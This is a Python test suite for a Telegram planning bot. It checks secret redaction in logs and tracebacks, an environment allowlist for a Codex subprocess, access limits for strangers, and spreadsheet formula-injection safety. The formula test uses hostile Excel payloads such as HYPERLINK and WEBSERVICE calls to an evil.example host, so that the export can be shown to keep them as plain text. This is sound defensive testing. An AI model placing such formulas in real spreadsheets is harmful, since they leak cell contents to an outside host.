"""Security hardening: secrets never reach the error log or the Codex child process; source text never becomes an
Excel formula; a stranger's message never touches planner state. All secret values here are synthetic."""
import asyncio
import os
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

from aiogram.enums import ChatType
from openpyxl import Workbook, load_workbook

import file_cache as fc
import planner_ai as ai
import planner_ui as ui
from export_templates import HEADERS, make_workbook
from planner_memory import MemoryStore
from planner_storage import DraftStore

OWNER = 7


class FakeStore:
    def __init__(self, path):
        self.path = Path(path)

    def connect(self):
        import sqlite3
        db = sqlite3.connect(self.path)
        db.execute('CREATE TABLE IF NOT EXISTS metadata (key TEXT PRIMARY KEY, value TEXT)')
        return _Conn(db)


class _Conn:
    def __init__(self, db):
        self.db = db

    def __enter__(self):
        return self.db

    def __exit__(self, *exc):
        self.db.commit()
        self.db.close()


class RedactTests(unittest.TestCase):
    def test_known_secret_values_are_replaced_raw_and_percent_encoded(self):
        text = 'connect failed for p@ss/word1 and p%40ss%2Fword1 using tok-123456'
        out = fc.redact(text, [fc.quote('p@ss/word1', safe=''), 'p@ss/word1', 'tok-123456'])
        for leaked in ('p@ss/word1', 'p%40ss%2Fword1', 'tok-123456'):
            self.assertNotIn(leaked, out)
        self.assertIn(fc.HIDDEN, out)

    def test_patterns_hide_credentials_without_exact_values(self):
        samples = {
            'dsn': 'postgresql://reader:Sup3rSecret@db.example.com:5432/wb',
            'kv': 'OperationalError: password=Sup3rSecret host=db.example.com',
            'json': '{"token": "Sup3rSecret"}',
            'url': 'GET https://x.example/v4?key=Sup3rSecret&alt=json',
            'bearer': 'Authorization: Bearer Sup3rSecret.abc-def',
            'telegram': 'bot' + '123456789' + ':' + 'A' * 35 + '/getMe',
            'google': 'AIza' + 'B' * 30,
            'pem': '-----BEGIN ' + 'PRIVATE KEY-----\nMIIEvQIBADANBg\n-----END ' + 'PRIVATE KEY-----',
        }
        for name, text in samples.items():
            out = fc.redact(text)
            for leaked in ('Sup3rSecret', 'A' * 35, 'B' * 30, 'MIIEvQ'):
                self.assertNotIn(leaked, out, name)
            self.assertIn(fc.HIDDEN, out, name)

    def test_non_secret_text_is_untouched(self):
        text = 'KeyError: supply 12345678 in file_cache.py line 42'
        self.assertEqual(fc.redact(text), text)

    def test_secret_values_come_from_env_file_and_environment_by_name_only(self):
        with tempfile.TemporaryDirectory() as folder:
            (Path(folder) / '.env').write_text(('PGPASSWORD=hunter2hunter2\nTELEGRAM_BOT_TOKEN=tgtokentgtoken\n'
                                               'TELEGRAM_ALLOWED_USER_ID=424242\nPLAIN=notsecretvalue\n'), encoding='utf-8')
            with patch.object(fc, 'PROJECT', Path(folder)), patch.dict(os.environ, {'SOME_API_KEY': 'envkey-9999'}, clear=True):
                found = fc.secret_values()
        for expected in ('hunter2hunter2', 'tgtokentgtoken', 'envkey-9999'):
            self.assertIn(expected, found)
        self.assertNotIn('notsecretvalue', found)

    def test_traceback_chain_is_scrubbed_and_keeps_stack_and_class(self):
        def inner():
            raise ConnectionError('postgresql://u:Sup3rSecret@h/db refused')

        try:
            try:
                inner()
            except ConnectionError as cause:
                raise RuntimeError('wrapped, token=Sup3rSecret') from cause
        except RuntimeError as exc:
            with patch.object(fc, 'secret_values', return_value=['Sup3rSecret']):
                text = fc.safe_traceback(exc)
        self.assertNotIn('Sup3rSecret', text)
        self.assertIn('ConnectionError', text)
        self.assertIn('RuntimeError', text)
        self.assertIn('inner', text)

    def test_scrubbing_failure_falls_back_to_stack_without_messages(self):
        try:
            raise ValueError('password=Sup3rSecret')
        except ValueError as exc:
            with patch.object(fc, 'secret_values', return_value=[]), \
                    patch.object(fc, 'redact', side_effect=RuntimeError('boom')):
                text = fc.safe_traceback(exc)
        self.assertNotIn('Sup3rSecret', text)
        self.assertIn('ValueError', text)

    def test_unreadable_env_file_falls_back_to_stack_without_messages(self):
        with tempfile.TemporaryDirectory() as folder:
            (Path(folder) / '.env').write_text('DB_PASSWORD=x7Q\n', encoding='utf-8')
            try:
                raise RuntimeError('authentication failed for x7Q')
            except RuntimeError as exc:
                with patch.object(fc, 'PROJECT', Path(folder)), patch.dict(os.environ, {}, clear=True), \
                        patch.object(fc, 'dotenv_values', side_effect=PermissionError('denied')):
                    text = fc.safe_traceback(exc)
        self.assertNotIn('x7Q', text)
        self.assertNotIn('authentication failed', text)
        self.assertIn('RuntimeError', text)

    def test_missing_env_file_is_not_an_error(self):
        with tempfile.TemporaryDirectory() as folder:
            with patch.object(fc, 'PROJECT', Path(folder)), patch.dict(os.environ, {'DB_PASSWORD': 'x7Q'}, clear=True):
                self.assertEqual(fc.secret_values(), ['x7Q'])

    def test_short_credentials_are_hidden_but_short_host_settings_are_not_guessed(self):
        with tempfile.TemporaryDirectory() as folder:
            (Path(folder) / '.env').write_text('PASSWORD=x7Q\nPGPORT=5432\nDATABASE_URL=pg\n', encoding='utf-8')
            with patch.object(fc, 'PROJECT', Path(folder)), patch.dict(os.environ, {}, clear=True):
                found = fc.secret_values()
                try:
                    raise RuntimeError('authentication failed for x7Q on port 5432')
                except RuntimeError as exc:
                    text = fc.safe_traceback(exc)
        self.assertIn('x7Q', found)
        self.assertNotIn('5432', found)
        self.assertNotIn('x7Q', text)

    def test_bare_key_and_quoted_values_with_spaces_are_hidden_whole(self):
        for text in ('request failed: key=synthetic-123', 'secret_key=synthetic-123', 'cfg {"api_key": "synthetic-123"}',
                     "password='synthetic secret value'", 'password="synthetic secret value"'):
            out = fc.redact(text)
            for leaked in ('synthetic-123', 'synthetic', 'secret value'):
                self.assertNotIn(leaked, out, text)
            self.assertIn(fc.HIDDEN, out)

    def test_refresh_error_log_never_contains_the_secret(self):
        with tempfile.TemporaryDirectory() as folder:
            store = FakeStore(Path(folder) / 'cache.sqlite3')
            service = fc.CacheService(store)
            error = OSError('could not connect: postgresql://reader:Sup3rSecret@db/wb')
            with patch.object(service, 'refresh_sync', side_effect=error), \
                    patch.object(fc, 'secret_values', return_value=['Sup3rSecret']):
                with self.assertRaises(RuntimeError) as raised:
                    asyncio.run(service.refresh())
            log = (Path(folder) / 'refresh_error.log').read_text(encoding='utf-8')
        self.assertNotIn('Sup3rSecret', log)
        self.assertNotIn('Sup3rSecret', str(raised.exception))
        self.assertIn('OSError', log)


class FormulaTests(unittest.TestCase):
    def build(self, product, vendor='wild1', barcode='1234567890123'):
        with tempfile.TemporaryDirectory() as folder:
            base, out = Path(folder) / 'base.xlsx', Path(folder) / 'out' / 'f.xlsx'
            wb = Workbook()
            wb.active.append(HEADERS)
            wb.active.append([''] * len(HEADERS))
            wb.save(base)
            record = dict(nm_id='123456789', quantity='5', dt='10131010/201026/1234567', country='156', product=product)
            make_workbook(base, [(record, dict(barcode=barcode, vendor_code=vendor))], out)
            workbook = load_workbook(out)
            try:
                sheet = workbook.active
                cols = {h: i + 1 for i, h in enumerate([c.value for c in sheet[1]])}
                return {h: sheet.cell(2, cols[h]) for h in HEADERS}
            finally:
                workbook.close()

    def test_source_text_starting_with_equals_stays_text(self):
        payloads = ['=HYPERLINK("http://evil.example/?"&A1,"x")', '=WEBSERVICE("http://evil.example")', '=1+1']
        for payload in payloads:
            for field in ('product', 'vendor', 'barcode'):
                kwargs = {field: payload}
                cells = self.build(**{**dict(product='Item'), **kwargs})
                cell = cells[{'product': 'Наименование товара', 'vendor': 'Артикул продавца', 'barcode': 'Баркод товара'}[field]]
                self.assertEqual(cell.data_type, 's', (field, payload))
                self.assertEqual(cell.value, payload)

    def test_ordinary_values_and_numbers_are_unchanged(self):
        cells = self.build('Вентилятор 3-в-1')
        self.assertEqual(cells['Наименование товара'].value, 'Вентилятор 3-в-1')
        self.assertEqual(cells['Количество'].value, 5)
        self.assertEqual(cells['Количество'].data_type, 'n')


class CodexEnvTests(unittest.TestCase):
    def test_only_allowlisted_variables_reach_the_child(self):
        environ = {'PATH': '/bin', 'Path': 'C:/x', 'SystemRoot': 'C:/Windows', 'USERPROFILE': 'C:/u', 'CODEX_HOME': '/h',
                   'LC_ALL': 'C', 'XDG_CONFIG_HOME': '/c', 'HTTPS_PROXY': 'http://p', 'https_proxy': 'http://p',
                   'TELEGRAM_BOT_TOKEN': 's1', 'PGPASSWORD': 's2', 'GOOGLE_APPLICATION_CREDENTIALS': 's3',
                   'OPENAI_API_KEY': 's4', 'CODEX_API_KEY': 's5', 'DATABASE_URL': 's6', 'ANYTHING_ELSE': 's7'}
        child = ai._child_env(environ)
        for kept in ('PATH', 'Path', 'SystemRoot', 'USERPROFILE', 'CODEX_HOME', 'LC_ALL', 'XDG_CONFIG_HOME', 'HTTPS_PROXY',
                     'https_proxy'):
            self.assertIn(kept, child)
        for dropped in ('TELEGRAM_BOT_TOKEN', 'PGPASSWORD', 'GOOGLE_APPLICATION_CREDENTIALS', 'OPENAI_API_KEY',
                        'CODEX_API_KEY', 'DATABASE_URL', 'ANYTHING_ELSE'):
            self.assertNotIn(dropped, child)

    def test_both_cli_calls_use_the_allowlisted_environment(self):
        calls = []

        def runner(cmd, **kw):
            calls.append(kw["env"])
            if "login" in cmd:
                return SimpleNamespace(returncode=0, stdout="Logged in using ChatGPT", stderr="")
            out = cmd[cmd.index("--output-last-message") + 1]
            Path(out).write_text("{}", encoding="utf-8")
            return SimpleNamespace(returncode=0, stdout="", stderr="")

        with patch.dict(os.environ, {'TELEGRAM_BOT_TOKEN': 'secret', 'PGPASSWORD': 'secret', 'PATH': os.environ.get('PATH', '')}):
            try:
                ai.run_codex("hi", runner=runner, finder=lambda: ["codex"])
            except ai.AIRejected:
                pass  # the empty answer is not a valid proposal; only the child environment matters here
        self.assertEqual(len(calls), 2)
        for env in calls:
            self.assertNotIn('TELEGRAM_BOT_TOKEN', env)
            self.assertNotIn('PGPASSWORD', env)


def message(text, uid=OWNER, chat_type=ChatType.PRIVATE):
    return SimpleNamespace(from_user=SimpleNamespace(id=uid), chat=SimpleNamespace(type=chat_type), text=text,
                           answer=AsyncMock())


class StrangerTests(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        d = self.tmp.name
        self.ctl = ui.PlannerController(store=DraftStore(os.path.join(d, "drafts.sqlite3")), sheets=SimpleNamespace(),
                                        memory=MemoryStore(os.path.join(d, "mem.sqlite3")),
                                        is_owner=lambda uid, ct: uid == OWNER and ct == ChatType.PRIVATE)

    async def test_menu_text_from_a_group_or_stranger_does_not_reset_owner_state(self):
        await self.ctl.handle_message(message("Новый план"))
        generation = self.ctl._gen.get(OWNER, 0)
        state = self.ctl._st.get(OWNER)
        self.assertIsNotNone(state)
        for leave in ("Главное меню", "Декларации", "Обновить базу"):
            self.assertFalse(await self.ctl.handle_message(message(leave, chat_type=ChatType.GROUP)))
            self.assertFalse(await self.ctl.handle_message(message(leave, uid=99)))
        self.assertEqual(self.ctl._gen.get(OWNER, 0), generation)
        self.assertIs(self.ctl._st.get(OWNER), state)
        self.assertNotIn(99, self.ctl._gen)

    async def test_owner_in_private_chat_can_still_leave_the_menu(self):
        await self.ctl.handle_message(message("Новый план"))
        generation = self.ctl._gen.get(OWNER, 0)
        self.assertFalse(await self.ctl.handle_message(message("Главное меню")))
        self.assertEqual(self.ctl._gen.get(OWNER, 0), generation + 1)
        self.assertNotIn(OWNER, self.ctl._st)


if __name__ == '__main__':
    unittest.main()
